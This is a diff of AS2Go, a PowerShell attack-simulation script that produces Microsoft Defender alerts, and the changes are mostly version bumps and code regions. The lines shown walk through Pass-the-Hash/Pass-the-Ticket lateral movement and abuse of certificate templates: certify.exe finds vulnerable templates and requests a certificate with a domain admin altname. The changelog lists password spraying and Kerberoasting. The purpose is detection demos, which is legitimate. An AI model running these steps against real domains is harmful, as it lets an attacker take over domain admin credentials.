@@ -21,8 +21,8 @@ My goal is to create expressive and representative Microsoft Defender for Endpoi
 
 .NOTES
 
-last update: 2022-11-09
-File Name  : AS2Go.ps1 | Version 2.5.7
+last update: 2022-11-10
+File Name  : AS2Go.ps1 | Version 2.5.8
 Author     : Holger Zimmermann | me@mrhozi.com | @HerrHozi
 
 
@@ -47,7 +47,8 @@ https://herrHoZi.com
 ######                                                                     #####
 ################################################################################
 
-# 2022-11-04 | v2.5.7 |  ADD Function xxxxx
+# 2022-11-10 | v2.5.8 |  add developer mode switch and region to source code
+# 2022-11-08 | v2.5.7 |  add developer mode switch and region to source code
 # 2022-11-04 | v2.5.6 |  ADD Function New-PasswordSprayAttack
 # 2022-10-15 | v2.5.5 |  ADD Function Kerberoasting
 # 2022-10-13 | v2.1.1 |  Update Function Start-AS2GoDemo | Protected User Error Routine
@@ -83,8 +84,8 @@ Param (
 
 [bool]$showStep = $true # show the steps in an image
 
-$lastupdate   = "2022-11-09"
-$version      = "2.5.7.0" 
+$lastupdate   = "2022-11-10"
+$version      = "2.5.8.0" 
 $path         =  Get-Location
 $scriptName   =  $MyInvocation.MyCommand.Name
 $scriptLog    = "$path\$scriptName.log"
@@ -2436,10 +2437,11 @@ Do
 Clear-Host
 Write-Host "____________________________________________________________________`n" 
 Write-Host "                 Attack Level - LATERAL MOVEMENT                    "
-Write-Host "            Choose your Lateral Movement Technique!                 "
 Write-Host "____________________________________________________________________`n" 
 
-$question = "`nEnter Pass-the-Hash (H), Pass-the-Ticket (T) or skip (S) this step! Default "
+Write-Host "Choose your Lateral Movement Technique!                 "
+
+$question = "`nEnter Pass-the-Hash (H), Pass-the-Ticket (T) or skip (S) this attack! Default "
 $answer   = Get-Answer -question $question -defaultValue $LateralMovement
 
 If ($answer -eq $PtH)
@@ -2510,11 +2512,15 @@ write-log -Message "Start Attack Level - Steal or Forge Authentication Certifica
 # define parameter
 $CAtemplate = "AS2Go"
 $altname =    $domainadmin
-$pemFile =    ".\$altname.pem"   
+$pemFile =    ".\$altname.pem"
 
 Write-Host "____________________________________________________________________`n" 
 Write-Host "      Step 1 - Get the Enterprise Certification Authority"
 Write-Host "____________________________________________________________________`n"     
+   
+#region Step 1 - Get the Enterprise Certification Authority
+
+
 
 Write-Host "  NEXT STEP: " -NoNewline
 Write-Host "certutil`n" -ForegroundColor $global:FGCCommand
@@ -2529,13 +2535,14 @@ $temp       = $MyCAConfig[7].Split([char]0x0060).Split([char]0x0027)
 $myEntCA    = $temp[1]
 Write-Host "Found & use Enterprise Certification Authority: $myEntCA`n" -ForegroundColor $global:FGCHighLight
 pause
-
+#endregion 2
 
 Clear-Host
 Write-Host "____________________________________________________________________`n" 
 Write-Host "      Step 2 - Finding an Vulnerable Certificate Templates "
 Write-Host "____________________________________________________________________`n"
 
+#region Step 2 - Finding an Vulnerable Certificate Templates
 Write-Host "  NEXT STEP: " -NoNewline
 Write-Host ".\certify.exe find /vulnerable`n" -ForegroundColor $global:FGCCommand
 pause
@@ -2557,15 +2564,15 @@ if ($prompt -ne $yes)
   
 } Until ($prompt -eq $yes)
 
-
-#Check connectio to Enterprise CA
-$result = certutil -config $myEntCA -ping
-$text = "copy the certificate content printed out by certify and paste it into this file"
+#endregion Step 2 - Finding an Vulnerable Certificate Templates
 
 Clear-Host
 Write-Host "____________________________________________________________________`n" 
 Write-Host "      Step 3 - Requesting Certificate with Certify                           "
 Write-Host "____________________________________________________________________`n"
+
+#region Step 3 - Requesting Certificate with Certify
+
 
 Write-Host "  NEXT STEP: " -NoNewline
 Write-Host ".\certify.exe request /ca:$myEntCA /template:$CAtemplate /altname:$altname`n" -ForegroundColor $global:FGCCommand
@@ -2573,6 +2580,10 @@ Write-Host ".\certify.exe request /ca:$myEntCA /template:$CAtemplate /altname:$a
 #Write-host "Do you want to use this CA template - $CAtemplate " -ForegroundColor Yellow
 
 pause
+
+#Check connectio to Enterprise CA
+$result = certutil -config $myEntCA -ping
+$text = "copy the certificate content printed out by certify and paste it into this file"
 
 
 if (!(Test-Path $pemFile))
@@ -2606,6 +2617,7 @@ pause
 
 }
 
+#endregion Step 3 - Requesting Certificate with Certify
 
 Clear-Host
 
@@ -2618,6 +2630,7 @@ $question = "`nDo you need to REPEAT this attack level - Y or N? Default "
 $repeat   = Get-Answer -question $question -defaultValue $no
    
 } Until ($repeat -eq $no)
+
 
 #endregion Attack Level - Forge Authentication Certificates
 
